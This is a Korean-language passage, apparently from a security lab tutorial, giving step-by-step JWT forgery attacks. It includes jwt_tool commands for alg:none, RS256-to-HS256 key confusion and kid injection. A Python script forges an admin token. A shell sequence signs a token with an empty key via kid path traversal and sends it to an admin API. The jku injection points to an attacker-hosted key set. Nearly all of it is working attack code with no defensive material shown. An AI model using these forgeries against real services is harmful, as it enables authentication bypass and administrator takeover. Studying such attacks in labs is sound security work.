    ▶ 1단계: alg 변조 공격 카테고리
    | 공격 | CVE | 원리 |
    |---|---|---|
    | alg:none | CVE-2015-9235 | 서명 검증 비활성 |
    | RS256 → HS256 (Key Confusion) | CVE-2016-10555 | 공개키를 HMAC 비밀로 사용 |
    | kid (key ID) injection | — | DB 조회 키 변조 |
    | jku (JWK Set URL) injection | — | 외부 키 URL 강제 |
    | embedded JWK | — | 토큰 안에 키 포함 |

    ▶ 2단계: 도구 A — jwt_tool 으로 자동 alg 변조
    ```bash
    # alg:none
    python3 ~/jwt_tool/jwt_tool.py "$JWT" -X a
    # 출력: 변조된 토큰

    # RS256 → HS256 key confusion (공개키 필요)
    # 1. 서버의 공개키 다운로드
    curl -s http://10.20.30.80/.well-known/jwks.json -o /tmp/jwks.json
    # 또는
    curl -s http://10.20.30.80/jwt/public-key.pem -o /tmp/pub.pem

    # 2. jwt_tool 으로 변조
    python3 ~/jwt_tool/jwt_tool.py "$JWT" -X k -pk /tmp/pub.pem
    # -X k: key confusion mode

    # 3. kid injection
    python3 ~/jwt_tool/jwt_tool.py "$JWT" -X i
    # -X i: kid path traversal
    ```

    ▶ 3단계: 도구 B — 수동 RS256 → HS256 변조 (Python)
    ```python
    import jwt

    with open('/tmp/pub.pem', 'rb') as f:
        public_key = f.read()

    # 공개키를 HMAC 비밀로 사용 (서버가 alg 을 신뢰하면 통과)
    forged = jwt.encode(
      {"sub": "admin", "role": "admin", "exp": 9999999999},
      public_key,  # 이상함 (공개키를 비밀로) — 그래서 attack 이름이 "key confusion"
      algorithm='HS256',
      headers={'alg': 'HS256'}
    )
    print(forged)
    ```

    ▶ 4단계: 도구 C — kid injection (LFI / SQLi 통한 키 우회)
    ```bash
    # kid 가 file path 로 사용되는 경우 (LFI)
    NEW_HEADER=$(echo -n '{"alg":"HS256","kid":"../../../../../../dev/null"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
    # /dev/null 은 빈 키 → empty key 로 HMAC 시도
    EMPTY_HMAC=$(echo -n "$NEW_HEADER.$PAYLOAD" | openssl dgst -sha256 -hmac "" -binary | base64 -w0 | tr '+/' '-_' | tr -d '=')
    FORGED="$NEW_HEADER.$PAYLOAD.$EMPTY_HMAC"
    curl -H "Authorization: Bearer $FORGED" http://target/api/admin
    ```

    ▶ 5단계: 도구 D — jku / x5u URL injection
    ```bash
    # 공격자 호스팅 키
    cat > /tmp/jwks.json <<EOF
    {"keys":[{"kty":"RSA","kid":"attacker","n":"...","e":"AQAB"}]}
    EOF
    python3 -m http.server 8000 --directory /tmp &

    # JWT 의 jku 헤더를 attacker 로 변조
    NEW_HEADER=$(echo -n '{"alg":"RS256","jku":"http://attacker:8000/jwks.json","kid":"attacker"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
    # private key 로 서명 후 전송
    ```

